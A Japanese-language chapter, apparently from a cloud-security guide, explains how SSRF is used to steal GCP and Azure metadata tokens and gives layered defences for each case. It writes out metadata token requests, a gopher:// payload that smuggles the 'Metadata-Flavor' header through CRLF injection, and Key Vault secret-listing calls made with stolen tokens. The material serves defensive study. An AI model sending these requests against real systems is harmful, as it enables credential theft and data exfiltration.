curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

ヘッダーを付けずに同じURLへアクセスすると `403 Forbidden` が返る。これが「意図された防御」であり、後述するように、この防御を回避する経路（ヘッダーを付けられる別のSSRF手法や、ヘッダー検証自体が甘い経路）が実際の攻撃の焦点になる。

サービスアカウントのトークンを取得するエンドポイントの例:

```
GET /computeMetadata/v1/instance/service-accounts/default/token
GET /computeMetadata/v1/instance/service-accounts/default/scopes
GET /computeMetadata/v1/instance/service-accounts/<email>/token
GET /computeMetadata/v1/project/project-id
GET /computeMetadata/v1/instance/attributes/<カスタムメタデータキー>
```

`default/token` を叩くと、そのインスタンス（またはGKEノード、Cloud Functionsの実行基盤など）に紐づくサービスアカウントの、有効期限が短い（通常1時間程度の）OAuth 2.0アクセストークンがJSONで返る。これをそのまま `Authorization: Bearer <token>` として使えば、Cloud Storage、BigQuery、Compute Engine APIなど、そのサービスアカウントが持つ権限の範囲で任意の操作ができてしまう。

### 実際の攻撃導線: DNSリバインディングによるヘッダー検証の回避

`Metadata-Flavor: Google` ヘッダーによる防御は、「攻撃者が任意のヘッダーを付けられない」単純なSSRF（例: サーバーがユーザー指定URLの画像を取得して表示するだけの機能）には有効である。しかし記事は、**ヘッダー検証だけでは防ぎきれないケース**として、Cloud Functions上で動くヘッドレスブラウザに対するDNSリバインディング攻撃を挙げている。

DNSリバインディングとは、あるドメイン名の名前解決結果を、ブラウザ側のチェックが通った直後に別のIPアドレス（この場合は内部のメタデータサーバーのアドレス）へすり替える手法である。ブラウザの同一オリジンポリシー（Same Origin Policy、あるオリジン=スキーム+ホスト+ポートの組み合わせのJavaScriptが、別オリジンのレスポンス内容を読み取れないようにする仕組み）は**ホスト名**単位で判定されるため、DNSの応答を攻撃者が制御できれば、見た目上は同じホスト名のまま、実際の接続先だけを内部IPへ切り替えられる。しかもブラウザから発行される `fetch`/`XMLHttpRequest` は、対象がJSON等の場合は自動的に妥当な `Host` ヘッダーを送るため、Cookieのようなブラウザ特有の情報だけでなく、状況によってはカスタムヘッダーの付与も可能になり、`Metadata-Flavor` ヘッダーを満たすリクエストをブラウザに代行させられてしまう。

記事はこの経路がGCP Cloud Functionsのようにヘッドレスブラウザ（サーバー側で任意URLをレンダリングする機能、PDF生成やスクリーンショット取得機能などでよく使われる）を動かす実行基盤で特に問題になると説明している。Cloud Functionsは `https://<region>-<GCPプロジェクト名>.cloudfunctions.net/<関数名>` という予測可能なURLパターンを持つため、攻撃者が対象プロジェクトを特定しやすいという副次的な問題も指摘されている。

### GKEノードにおけるメタデータの悪用

Google Kubernetes Engine（GKE）のノードは、内部的には通常のGCEインスタンスである。記事は次の点を強調する。

> 「GKEの全ワークロードは、デフォルトでメタデータAPIに到達でき、その認証情報を取得できる」

GKEのノードプールに割り当てられるデフォルトサービスアカウントは、しばしば**プロジェクトレベルのEditorロール**（数千に及ぶ権限を持つ強力な事前定義ロール）にバインドされている。これはKubernetesのRBAC（クラスタ内のアクセス制御）とは全く別レイヤーの話であり、**Kubernetes上でNamespaceを越えられない権限しか持たないPodであっても、コンテナ内からメタデータサーバーに到達できればノードのサービスアカウント権限をまるごと奪える**、という点が本質的なリスクである。つまりコンテナのブレイクアウトなしに、単なるSSRFやコマンドインジェクションがあるPodから、クラスタ全体・プロジェクト全体へと権限昇格しうる。

### Cloud Buildにおける悪用

Cloud Buildは、ビルドの実行ごとに `<プロジェクトID>@cloudbuild.gserviceaccount.com` というGoogle管理のサービスアカウントを使う。記事は、リポジトリへの**Contributor（寄稿者)権限**さえあれば、ビルドステップに任意のコマンドを注入してこのサービスアカウントのメタデータトークンを取得できると述べている。CI/CDパイプラインの実行環境は「一時的で使い捨てだから安全」と見なされがちだが、実行中はGKEノードと同じくメタデータサービスに到達できる通常のVM（またはコンテナ）であり、同じ理屈が成立する。

### サービスアカウントの設計問題

記事はGCPのデフォルト設計そのものにも触れている。プロジェクト作成時に自動生成される**Compute Engineデフォルトサービスアカウント**は、ユーザー管理のサービスアカウントとして幅広い権限を持ちがちであり、加えて記事執筆時点でプロジェクトには47個ものGoogle管理サービスアカウント（各種マネージドサービスが内部的に使う、範囲が把握しづらいアカウント群）が存在すると指摘されている。デフォルトのサービスアカウントをそのまま使い続けることは、「メタデータを盗まれたときに何が奪われるか」を無用に大きくする。

### 防御策

dxa4481の記事が挙げる防御は、大きく分けて「メタデータへの到達自体を絶つ」層と「到達されても被害を抑える」層の2つに整理できる。

**到達自体を絶つ**

- **Hostヘッダー検証**: サーバー側でホストヘッダーの妥当性を検証し、DNSリバインディングで偽装されたリクエストを見抜く。ヘッドレスブラウザやサーバーサイドのHTTPクライアントを使う機能では、接続先IPをDNS解決の都度チェックし、内部レンジ（`169.254.169.254` を含む）への接続を拒否するのが確実である。
- **GKEにおけるメタデータの秘匿（Metadata Concealment、およびその後継のGKEメタデータサーバー）**: Pod内から見えるメタデータの範囲を、ノード全体のものではなくPodに必要な範囲へ絞り込む仕組み。
- **Workload Identity**: GKEのPodにノードのサービスアカウントを直接使わせず、KubernetesのサービスアカウントとGCPのサービスアカウントを1対1で紐づけ、Pod単位で必要最小限の権限を持つ短命な認証情報を発行させる仕組み。記事は「GKEクラスタでWorkload Identityを有効化すること」を明確な推奨事項として挙げている。
- **Shielded GKE Nodes**: ノードの整合性検証などを強化し、ノード自体の乗っ取りを難しくする。

**到達されても被害を抑える**

- **サービスアカウント権限の最小化**: 記事の結論部分は「デフォルトのユーザー管理IDのスコープを全面的に絞り込め（descope your default user managed identities across the board）」という一文に集約される。Editorロールのような広範な事前定義ロールをワークロードに使い続けず、必要な操作だけを許すカスタムロールに置き換えることが、メタデータ窃取そのものを防げなくても被害を局所化する。
- **異常検知**: Stackdriver（現Cloud Monitoring/Logging）でのカスタムアラート設定や、Event Threat Detectionサービスによる、通常と異なるパターンでの認証情報利用の検知。記事はこの時点でのEvent Threat Detectionの検知能力がこの種の攻撃に対しては限定的だったとも述べており、単一の防御層に頼らない多層防御の重要性を示している。

### SSRFからの実践的な奪取手法: gopher://によるヘッダー偽装

dark-moon.orgの記事「SSRF to GCP Metadata: gopher://でトークン窃取」は、上記の「ヘッダー検証さえ突破できれば奪える」という弱点を、DNSリバインディングとは別の角度、すなわち**プロトコルレベルのバイパス**で突く手法を扱っている。

> ⚠️ **未取得の資料の一部について**: 本記事はWebFetchで取得できましたが、掲載コードは要約された抜粋のみが得られており、記事全文中の他の具体例（実際のCVEやツール名など）は反映できていない可能性があります。詳細は原文を直接ご確認ください: https://dark-moon.org/blog/ssrf-gcp-metadata-token-theft/

想定シナリオは、プロフィール画像を外部URLから取得する機能に存在するSSRFである。バックエンドはPHPのcurlライブラリを使ってユーザー指定URLを取得しており、これが `gopher://` スキームをサポートしていた、という設定である。

#### なぜgopherが「任意のヘッダー」を作れるのか

`http://` や `https://` スキームでSSRFを行う場合、多くのSSRF脆弱性ではURLの**パス部分**しか攻撃者が制御できず、`Host` や追加のカスタムヘッダーはクライアント（curlなど)側の実装が自動生成するため、攻撃者が `Metadata-Flavor: Google` のような任意ヘッダーを注入するのは難しい。

ところがgopherプロトコルは1990年代初頭に設計された非常にシンプルなテキストベースのプロトコルで、サーバーに接続した後は「TCPコネクション上に生のバイト列を書き込むだけ」というのがその本質である。curlなどの実装は `gopher://host:port/_<送信したいバイト列>` という形式のURLを渡すと、`_` 以降の内容をURLデコードした上で、TCP接続確立直後にそのまま生バイトとして送信する。これはもともとgopher独自のセレクタ文字列を送る仕組みだが、**任意のバイト列を送れる**という性質上、そこにHTTPリクエストの生テキスト（メソッド行・ヘッダー行・空行）をまるごと詰め込んでしまえば、相手のサーバーからは「gopherクライアントを名乗る何か」ではなく「正しい形式のHTTPリクエストを送ってきたクライアント」として振る舞える。つまりgopherは、**攻撃者にHTTPリクエストの生成を完全に委ねてしまう抜け道**として悪用される。

記事が示すペイロードの構造は次のようなものである。

```
gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/...%20HTTP/1.1%0d%0a
Host:%20metadata.google.internal%0d%0a
Metadata-Flavor:%20Google%0d%0a%0d%0a
```

これを1行に展開すると、実質的に次のHTTPリクエストをTCP上に直接書き込んでいることになる。

```
GET /computeMetadata/v1/... HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google

```

ポイントは `%0d%0a`（CRLF、HTTPのヘッダー行を区切る改行コード）をURLエンコードした形でgopher URLのパス部分に埋め込んでいる点である。gopherのパースにはHTTPのような構文検証が存在しないため、任意のヘッダー（`Metadata-Flavor: Google` を含む）をそのまま注入できる。これにより、アプリケーション自体はいかなる特別なヘッダーもユーザーに与えていないにもかかわらず、curlに`gopher://`を渡すだけで**メタデータAPIのヘッダー検証を正面から満たすリクエスト**を作り出せてしまう。

#### 攻撃の流れ

記事が説明する攻撃の段階は次の通りである。

1. 外部URL（攻撃者が用意したサーバー）を指定し、SSRFが実際に動作することを確認する。
2. `http://metadata.google.internal/computeMetadata/v1/...` への直接アクセスを試み、ヘッダー不足により `403` が返ることを確認する（防御が機能していることの確認）。
3. 上記のgopherペイロードでリクエストを密輸（プロトコルの隙間を突いて、本来検査されるべき内容を検査を経ずに届けること）し、必須ヘッダーを満たしたリクエストを成立させる。
4. `cloud-platform` スコープ（GCPのほぼ全APIにアクセスできる、非常に広いOAuthスコープ）を持つサービスアカウントトークンを取得する。
5. 取得したトークンでCloud Storageバケット等にアクセスし、個人情報を含むデータを持ち出す。

盗まれたトークンのスコープが `cloud-platform` と、Google Compute Engineデフォルトサービスアカウントが持つ既定の広いスコープであった点が被害を拡大させた、と記事は指摘している。これはdxa4481の記事が述べる「デフォルトのサービスアカウントは過剰な権限を持ちがちである」という指摘と符合する。

#### 防御策

dark-moon.orgの記事が挙げる防御は次の通りである。

- **利用可能なスキームの許可リスト化（scheme allowlisting）**: 「プロフィール画像取得機能が `gopher://` や `dict://`、`file://` を話す正当な理由は存在しない」。URL取得を行うあらゆる機能で、HTTPクライアントに渡す前にスキームを `http`/`https` のみへ明示的に制限する。curlであれば `CURLOPT_PROTOCOLS` を `CURLPROTO_HTTP | CURLPROTO_HTTPS` に絞る、といった実装が該当する。
- **接続先IPアドレスの事前検証**: DNS解決結果を評価し、リンクローカルアドレス（`169.254.0.0/16`）やRFC1918のプライベートレンジ、ループバックなどへの接続を拒否する。ただしDNS解決とTCP接続の間で名前解決結果がすり替わるTOCTOU（Time-of-check to time-of-use、チェック時と使用時の間に状態が変わってしまう競合）に注意し、可能であれば接続確立後のソケットの実際の接続先IPを再検証する。
- **レスポンス内容を呼び出し元に一切返さない**: 画像として解釈できないレスポンスを握りつぶす、あるいはそもそも取得結果をエコーバックしない実装にすることで、たとえSSRFが成立してもBlind SSRF（レスポンス内容を攻撃者が直接見られないSSRF）にとどめ、トークン本体の窃取を難しくする。
- **サービスアカウントのスコープを必要最小限にする**: `cloud-platform` のような広域スコープではなく、そのワークロードが実際に必要とするAPI・操作だけに絞ったスコープ/ロールを付与する。
- **メタデータサーバーv2相当のセマンティクス**: ヘッダー検証だけに頼らず、そもそも本番アプリケーションのネットワーク経路からメタデータサーバーへの到達性自体を制限する（後述）。

> 出典: dark-moon, "SSRF to GCP Metadata: gopher://でトークン窃取" — https://dark-moon.org/blog/ssrf-gcp-metadata-token-theft/

### まとめ: この章で押さえるべき防御の全体像

2つの資料を合わせると、GCPメタデータAPI経由のクレデンシャル窃取に対する防御は、次のように多層で構成すべきことが分かる。

1. **アプリケーション層**: SSRFを生むURL取得機能では、スキームを `http`/`https` に限定し、内部IPレンジ（特に `169.254.169.254`）への接続を拒否し、DNS解決結果と実接続先の乖離（DNSリバインディング）にも対処する。レスポンス内容をそのまま返さない設計にすれば被害はさらに縮小する。
2. **プラットフォーム層**: GKEではWorkload Identityを有効化し、ノードのサービスアカウントをPodから直接使わせない。Cloud Functions・Cloud Buildなど「自分では意識しにくい実行基盤」にもメタデータ到達性があることを前提に、実行環境ごとのサービスアカウントも最小権限に保つ。
3. **IAM層**: デフォルトサービスアカウントやEditorロールのような広範な権限をワークロードにそのまま使わせず、必要な操作だけを許すカスタムロール・限定スコープへ置き換える。これは「メタデータを盗まれること」自体を防げなくても、盗まれたときの被害上限を大きく引き下げる、最も費用対効果の高い防御である。
4. **検知層**: 通常と異なるパターンでのサービスアカウント利用を監視・アラート化し、窃取されたトークンが悪用された際に早期に気づけるようにする。

いずれの資料も一貫して強調しているのは、「`Metadata-Flavor: Google` ヘッダーのチェックはSSRFに対する完全な防御ではなく、あくまで単純な攻撃を防ぐ最低限のハードルに過ぎない」という点である。DNSリバインディングやgopherスキームのように、攻撃者がヘッダーを含む生のリクエストを組み立てられる経路が一つでも残っていれば、このチェックは容易に迂回される。したがって実運用では、ネットワーク到達性の遮断とIAM権限の最小化という、ヘッダー検証に依存しない多層防御を前提に設計する必要がある。

## Azure IMDS / Managed Identityの悪用

### この節で扱うこと

AWSにIMDS（Instance Metadata Service）とEC2 IAMロールがあるように、Azureにも同じ役割を果たす仕組みがある。それが**IMDS（Azure Instance Metadata Service）**と**Managed Identity（マネージドID）**である。VM・App Service・Azure Functions・Azure Machine Learningなど、Azure上で動くコンピューティングリソースにSSRF（Server-Side Request Forgery：サーバーに攻撃者の指定したURLへ代理でリクエストさせる脆弱性）が存在する場合、攻撃者はその代理リクエストを使ってIMDSエンドポイントを叩き、そのリソースにアタッチされたManaged Identityの**OAuth 2.0アクセストークン**を窃取できる。窃取したトークンは、Azure Resource Manager（ARM）API・Key Vault・Storageなど、そのIdentityが認可されているあらゆるAzureサービスに対して、正規の認証情報として通用する。

AWSのIMDS窃取と原理は同じ（「内部専用のはずのメタデータAPIを、SSRFで外部から叩く」）だが、Azureには（1）IMDSそのものだけでなく管理面を担う**WireServer**という別のメタデータ経路があること、（2）保護ヘッダ（`Metadata: true`）の適用がサービスによって一貫していないこと、（3）盗んだトークンがKey Vaultの秘密情報奪取や権限昇格の起点になりやすいこと、といったAzure特有の論点がある。本節ではこれらを一つずつ、仕組みレベルで解説する。

### Azure IMDSの基本仕様

Azure IMDSは、AWSと同じくリンクローカルアドレス`169.254.169.254`上でリッスンする内部専用HTTPサービスであり、ハイパーバイザーのレベルで実装されている（＝ゲストOSのネットワークスタックを経由せず、その仮想マシン・コンテナからのみ到達できることを前提に設計されている）。Managed Identityのアクセストークンを取得するエンドポイントは次の形になる。

```
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Metadata: true
```

- `resource`パラメータは、取得したいトークンの**対象サービス（オーディエンス）**を指定する。`https://management.azure.com/`ならARM API向け、`https://vault.azure.net`ならKey Vault向け、`https://storage.azure.com/`ならStorage向けといった具合に、リクエストのたびに異なるサービスへの署名済みトークンを何度でも発行させられる。
- `Metadata: true`ヘッダが必須要件になっている。これはAWSのIMDSv1のように「HTTPでURLを叩けるだけで通る」のを防ぐための最低限の摩擦だが、後述するように**これは認証ではない**。値が`true`という文字列であることを確認しているだけの、いわば「わざと1つ余分なヘッダを付けさせることでブラウザや素朴なSSRF（単純なURLフェッチだけしかできないもの）からの直叩きを防ぐ」ためのチェックであり、SSRFの脆弱性が「任意のヘッダを付加できる」タイプ（例えばサーバーサイドでHTTPクライアントライブラリを使い、URLだけでなくヘッダも一部制御できてしまう構成や、CRLFインジェクションでヘッダを注入できる構成）であれば、この防御は容易に突破される。

> ⚠️ **未取得の資料の補足として**：`Metadata: true`ヘッダによる防御は、Microsoftが2019年前後にSSRF対策として導入した比較的新しいコントロールである。それ以前のAzure IMDSにはこの要件がなく、URLを叩けるだけの単純なSSRFでもトークンが取得できた。現在でも「ヘッダを要求しないレガシーなエンドポイント」がサービスによって残存することがある点は、CyberCXの調査（後述）で指摘されている通りである。

このリクエストが成功すると、次のようなJSONが返る（フィールド名は一般的なAzure IMDSレスポンスの形式）。

```json
{
  "access_token": "eyJ0eXAiOiJKV1Qi...",
  "expires_in": "3599",
  "expires_on": "1710000000",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer",
  "client_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

この`access_token`はAzure ADが発行した正規のBearerトークンであり、以降はどんなAzure REST APIに対しても通常のOAuth 2.0クライアントとまったく同じ扱いで通用する。

> 出典: Guardz — Exploiting Azure Managed Identity Tokens from IMDS — https://guardz.com/blog/exploiting-azure-managed-identity-tokens-from-imds/

### なぜIMDSのトークン窃取が致命的なのか：仕組みレベルの理由

Guardzの分析は、単に「トークンが盗める」という事実だけでなく、**そのトークンがどれだけ強力で、どれだけ見えにくいか**という点を重視している。要点を整理する。

**(1) MFAもConditional Accessも評価されない。**
通常、人間のユーザーがAzure ADにサインインする際は多要素認証（MFA）や条件付きアクセスポリシー（デバイスの状態、IPレンジ、リスクスコアなどに基づくアクセス制御）が評価される。しかしManaged Identityのトークン発行はサービス間認証（service-to-service）のために設計されたものであり、こうした人間向けのセキュリティレイヤーを一切通らない。IMDSにヘッダ1つ付けてリクエストするだけで、これらの防御をまるごとバイパスした状態のトークンが手に入る。

**(2) 有効期限は約24時間**（実際には`expires_in`で示される通り多くは1時間程度で、更新可能なリフレッシュの仕組みを持つ場合もあるが、記事は「侵害後のウィンドウが長く持続しうる」点を強調している）。SSRFの脆弱性自体が塞がれた後でも、すでに窃取済みのトークンはその有効期限内は使い続けられる。

**(3) 取得時にAzure側のサインインログ（Azure AD sign-in logs）に、通常の対話的サインインのような形跡が残りにくい。**
Managed Identityによるトークン取得はサービスプリンシパルの非対話型認証として扱われるため、監視担当者が「不審なユーザーサインイン」を探すような監視ロジックでは検知しづらい。

**(4) トークン自体（JWT）のクレーム（トークン内に埋め込まれた主張情報）に、攻撃者にとって有用な偵察情報が含まれる。**
記事が挙げる主要なクレームは次の通り。

- `oid`（Object ID）: そのManaged Identity自体を一意に識別する、Azure AD上のオブジェクトID。以降のGraph API呼び出しなどで「このIdentityが持つロール割り当て・グループメンバーシップ」を芋づる式に列挙する起点になる。
- `xms_mirid`: そのManaged Identityがどのリソース（サブスクリプション／リソースグループ／具体的なVMやWeb Appなど）に紐づいているかを示す、完全なAzureリソースパスを含むクレーム。攻撃者はこれを読むだけで、対象テナントのリソース階層構造（サブスクリプションID、リソースグループ名、リソース種別）を一撃で把握できる。
- `wids`: ディレクトリロール（Global Administratorなど、Azure AD全体に対する管理ロール）に関するシグナルを含み得るクレーム。
- `aud`（audience）: そのトークンがどのサービス向けに発行されたか（＝`resource`パラメータに対応する値）。

つまり1回のIMDSリクエストで、単なる「認証情報」以上の、**そのAzure環境の構造そのものを暴露する偵察データ**が手に入る。

**(5) トークンスプレー（token spray）が可能。**
IMDSは、要求された`resource`に対してそのManaged Identityが実際に権限を持っているかどうかを検証せずに、とりあえずトークンを発行する。認可（そのトークンで何ができるか）の判断は、ARMやKey VaultなどAzure IMDS自身ではなく**呼び出し先のサービス側**に委ねられている。Guardzの記事は「55以上の異なるサービスオーディエンスに対してトークンを発行させられる」と指摘しており、攻撃者はIMDSに対して`resource`パラメータを様々なサービスのURLに変えながら総当たりでトークンを要求し（＝トークンスプレー）、その後それぞれのトークンを実サービスに投げてみて「実際にどこまでアクセスできるか」を後から確認する、という探索的な攻撃が成立する。これはIMDS自身への負荷は小さく、しかも一つ一つのトークン発行はエラーにならないため、検知が難しい。

> 出典: Guardz — Exploiting Azure Managed Identity Tokens from IMDS — https://guardz.com/blog/exploiting-azure-managed-identity-tokens-from-imds/

**(6) 根本原因は「権限の後付け」。**
記事はAzure VMの初期状態を「デフォルトでは権限ゼロ」と評価しつつも、実運用では管理者が正当な業務要件（例えば「このVMからストレージを読ませたい」「このApp ServiceからKey Vaultの接続文字列を取らせたい」）のためにReader・Contributorといったロールを後から付与していく、と指摘する。この積み重ねの結果、当初は無害だったVMやApp Serviceが、気づかないうちに「侵害されれば広い範囲に被害が及ぶ」ホストへと変質していく。これはIMDS固有の欠陥というより、**クラウドのIAM設計における一般的な権限肥大化（privilege creep）**の問題がManaged Identity経由で表面化したものであり、防御の焦点は「IMDSを塞ぐ」ことよりも「そもそもManaged Identityに何の権限を与えるか」を最小化する運用にある。

### Key Vaultへの水平展開：窃取トークンで秘密情報を奪う

IMDSからトークンを盗んだ後、攻撃者が実際に狙う代表的な標的が**Azure Key Vault**（APIキー、接続文字列、証明書などの機密情報を一元管理するAzureのシークレットストア）である。Redfoxsecの解説は、この後続フェーズの手口を整理している。

**取得したBearerトークンでKey VaultのREST APIを直接叩く。** 例えば`resource=https://vault.azure.net`を指定して取得したトークンを使えば、次のようなAPI呼び出しでシークレットを列挙・取得できる（形式イメージ）。

```
GET https://<vault-name>.vault.azure.net/secrets?api-version=7.4
Authorization: Bearer <IMDSから取得したaccess_token>

GET https://<vault-name>.vault.azure.net/secrets/<secret-name>?api-version=7.4
Authorization: Bearer <IMDSから取得したaccess_token>
```

Managed Identityが対象のKey Vaultに対して`get`/`list`権限（アクセスポリシーモデルの場合）や`Key Vault Secrets User`のようなRBACロール（Azure RBACモデルの場合）を持っていれば、このリクエストだけでデータベースの接続文字列、他システムのAPIキー、サービスプリンシパルの資格情報などが一括で抜き取れる。Azure CLIが使える環境であれば、盗んだトークンを環境変数にセットするか、`az login --identity`のような形でCLIにそのIdentityとして振る舞わせ、`az keyvault secret list`のようなコマンドでも同様の列挙が可能になる。

**アクセスモデルの違いが被害範囲に直結する。** Key Vaultには古くからある「アクセスポリシー（Access Policy）」モデルと、比較的新しい「Azure RBAC」モデルの2つの権限管理方式がある。Redfoxsecの記事は、アクセスポリシーモデルは監査ログとの相性が悪く「誰が・いつ・何を」設定したのかを後から追跡しにくいのに対し、Azure RBACモデルは標準的なロール割り当てとして扱われるため監査可能性が高いと対比している。すでにアクセスポリシーモデルで運用されているKey Vaultは、権限の見通しが悪いまま拡張されがちで、結果として「本来は不要なはずの広い`get`/`list`権限」が付与されたままになりやすい。

**アイデンティティチェイニング（identity chaining）による権限昇格。** 記事はさらに、「低権限のリソースを侵害する → そのリソースにアタッチされたManaged Identityを使って、より広い権限（Contributor、Owner相当）を持つ別のリソースやサービスプリンシパルにアクセスする」という連鎖的な権限昇格の手口を説明している。侵害したVMのIdentity自体には強い権限がなくても、そのIdentityが「あるサービスプリンシパルの資格情報をローテーションできる」「別のManaged Identityにロールを割り当てる権限を持つ」といった間接的な経路を持っていれば、そこを踏み台にしてより強い権限へ横滑りできる。攻撃者はここで、正規のサービスプリンシパルを新規作成する、あるいは既存のものにシークレットを追加するなどして、**元の脆弱性（SSRF）が塞がれた後も使い続けられる永続的なバックドア**を仕込むことができる。

> 出典: Redfoxsec — Azure Key Vault and Managed Identity Exploitation Guide — https://www.redfoxsec.com/blog/azure-key-vault-and-managed-identity-exploitation

（本書では防御目的の学習に限定し、実在環境に対する検証・破壊的操作、実際のシークレット窃取やバックドア作成の実行は行わない。上記は攻撃者視点の手口の構造を理解し、防御側がログ監視・権限設計で塞ぐべきポイントを把握するための解説である。）

### WireServerという「もう一つのメタデータ経路」

CyberCXの調査は、Azure環境のSSRF対策を語るうえでIMDS（`169.254.169.254`）だけを見ていては不十分であると指摘する。Azure VMには、ゲストOS内で動くAzure VMエージェントがホスト（ハイパーバイザー側の管理基盤）と通信するための、もう一つのリンクローカルアドレス経路として**WireServer（`168.63.129.16`）**が存在する。

**WireServerの役割。** VM上で動くゲストエージェントに対して、DNS設定・DHCPリース情報・拡張機能（VM Extensions）の設定などをHTTP経由で配布する内部サービスであり、ポート80および32526で動作する。VM拡張機能（例えば「RunCommand」拡張のように、Azureポータルやスクリプトから任意コマンドをVM内で実行させる機能）の設定は、この経路を通じてVMエージェントに渡される。

**保護の非一貫性という問題点。** IMDSの`/metadata/identity/oauth2/token`は`Metadata: true`ヘッダを要求するが、この記事はエンドポイントによってこの要件が徹底されていないことを指摘している。例えば`/metadata/v1/instanceinfo`のようなIMDS内の一部エンドポイントはヘッダ要件なしでアクセスできてSSRFに対して脆弱であり、WireServer側の`/vmSettings`エンドポイントも同様にヘッダ要件がない。さらに、`Metadata: true`ヘッダによる防御自体も、SSRFの実装によっては**CRLFインジェクション**（HTTPリクエストの改行制御文字をURLやパラメータ経由で注入し、任意のヘッダやリクエスト行を追加してしまう脆弱性）で回避されうる、と指摘されている。CRLFインジェクションが刺さるSSRFであれば、攻撃者はURL文字列の中に`\r\nMetadata: true\r\n\r\n`のようなシーケンスを混入させ、本来ヘッダを付けられないはずのSSRFの経路からでもヘッダ要件をすり抜けることができる。

**WireServerアクセスと権限の関係。** 記事は、WireServer自体へのアクセスがゲストOS上で管理者権限（Windowsなら管理者、Linuxならroot相当）を持つプロセスに制限される設計になっている点にも触れているが、これは「VM内で管理者権限を持つアプリケーションとして動いているプロセス（例えばIISやNginxの一部設定、あるいはroot権限で動くWebアプリ）にSSRFが存在する場合には、この制限が実質的に無意味になる」ことも同時に示している。SSRF脆弱性を持つプロセス自体がすでにVM内で高い権限を持っていれば、「管理者権限を要求する」という保護は攻撃者にとって障壁にならない。

**具体的な悪用例：RunCommand拡張の保護設定抽出。** 記事はRunCommand拡張機能の設定がWireServer経由でやり取りされる際、暗号化された「保護設定（Protected Settings）」の形で渡される仕組みを示し、この経路を悪用することで実行対象のコマンド内容を抽出できる可能性を説明している。またSAS URL（Shared Access Signature：Azure Storageへの一時的な署名付きアクセスURL）を使ったメッセージのやり取りに対し、中間者的な形で介入できる可能性にも言及している。

> 出典: CyberCX — Azure SSRF Metadata — https://cybercx.com.au/blog/azure-ssrf-metadata/

**防御側が押さえるべき要点。** CyberCXは対策をアプリケーション層とVM層に分けて整理している。

- アプリケーション層：ユーザー入力として渡ってくるURL・IPアドレスの検証とサニタイズ、内部アドレス（`169.254.169.254`、`168.63.129.16`、その他プライベートレンジ）へのリクエストを許可しないアウトバウンドのホワイトリスト化、SSRFに強い設計のHTTPクライアント・APIの使用。
- VMレベル：アプリケーションプロセスの実行権限を必要最小限に抑えるサンドボックス化・リソース隔離、最小権限原則（Managed Identityも含む）の徹底、メタデータエンドポイントへの異常なアクセスパターンを捉えるログ監視とアノマリー検出。

### 4つのAzureサービスで見つかった実例：Orca Securityの調査

抽象的な原理だけでなく、実際にMicrosoftが修正した具体的な脆弱性を見ておくことは、この攻撃クラスの「陳腐化しない部分」と「バージョン依存で変化する部分」を切り分けるうえで重要である。Orca Securityは2022年、Azureの4つのサービスにおいてSSRF脆弱性を発見し、Microsoft Security Response Center（MSRC）に報告した。

| サービス | 認証要否 | 深刻度 | 報告日 | 修正日 |
|---|---|---|---|---|
| Azure Digital Twins | 認証不要 | Important | 2022年10月8日 | 2022年10月17日 |
| Azure Functions | 認証不要 | Important | 2022年11月12日 | 2022年12月9日 |
| Azure API Management | 認証必要 | Important | 2022年11月12日 | 2022年11月16日 |
| Azure Machine Learning | 認証必要 | Low | 2022年12月2日 | 2022年12月20日 |

**注目すべき点は2つ。**

第一に、4件のうち2件（Azure Digital Twins、Azure Functions）は**認証なしで悪用可能**だった、つまりAzureアカウントすら持たない外部の攻撃者が、そのAzureテナントのアカウントを一切持たずにSSRFを踏める状態だったということである。マネージドサービス（PaaS）の設定画面やAPIエンドポイント自体に脆弱性があると、単一テナントの権限管理をどれだけ厳格にしていても防げない。

第二に、4件すべてが「**Full SSRF（非ブラインドSSRF）**」に分類されている。これは、SSRFが単に「サーバーに代理リクエストを送らせられる」だけでなく、**そのレスポンス本文を攻撃者が丸ごと閲覧できる**タイプであることを意味する（対比されるのは「ブラインドSSRF」で、レスポンスの成否や応答時間などの間接的な情報しか得られないタイプ）。Full SSRFであれば、IMDSから取得したトークンのJSONをそのまま読み取れるため、被害はそのまま「トークン窃取が成立する」ところまで直結する。

**Microsoftが講じた緩和策。** Orcaの報告を受けて（あるいはこの調査時点で既に一部導入されていたものとして）、記事はMicrosoftのIMDSアクセス制御として次の2点を挙げている。

- `Metadata: true`ヘッダを要求し、かつ`X-Forwarded-For`ヘッダが付いているリクエストは拒否する。`X-Forwarded-For`はプロキシ経由のリクエストであることを示す一般的なヘッダであり、これが付いているリクエストはVM自身からの直接リクエストではなく、何らかの中継を経たリクエストである可能性が高いため、IMDSはそれを弾く。
- App ServiceやAzure Functionsのようなマネージド環境では、固定の`169.254.169.254`ではなく、`IDENTITY_ENDPOINT`と`IDENTITY_HEADER`という環境変数を使ってトークン取得先エンドポイントとヘッダ値をインスタンスごとに動的に変える方式（App Service/Functions向けのManaged Identityエンドポイント仕様）を採用している。これにより、攻撃者が固定URLをSSRFで叩くだけでは、正しいヘッダ値（動的に生成され環境変数にしか存在しない値）を知らない限りトークンを取得できなくなる。

Orcaの研究者はこれらの緩和策が実際に「IMDSエンドポイントへの直接アクセスを防いだ」ことを確認しつつも、それでもなお「local endpoint（各サービスがローカルに公開している別のエンドポイント）へのアクセスを通じて、依然として大きな被害の可能性が残っていた」と結論づけている。つまり**IMDS直叩きを塞ぐことは必要条件であって十分条件ではなく**、SSRFがサービス固有のローカルAPI・管理エンドポイントに到達できる限り、被害は形を変えて残り続ける。

> 出典: Orca Security — SSRF Vulnerabilities in Four Azure Services — https://orca.security/resources/blog/ssrf-vulnerabilities-in-four-azure-services/

### AWSとの比較で理解するAzure特有の論点

読者がすでにAWSのIMDS/IAMロール窃取（本書の別節）を理解している前提で、差分を整理しておく。

| 観点 | AWS (EC2 IMDS) | Azure (IMDS / Managed Identity) |
|---|---|---|
| メタデータアドレス | `169.254.169.254` | `169.254.169.254`（IMDS）＋ `168.63.129.16`（WireServer） |
| 最低限の防御 | IMDSv2でPUTベースのトークン取得を要求（GETのみのSSRFを無効化） | `Metadata: true`ヘッダ要求（一部エンドポイントは非対応） |
| 窃取物 | AccessKeyId / SecretAccessKey / SessionToken（STS一時クレデンシャル） | OAuth 2.0 Bearerアクセストークン（Azure AD発行） |
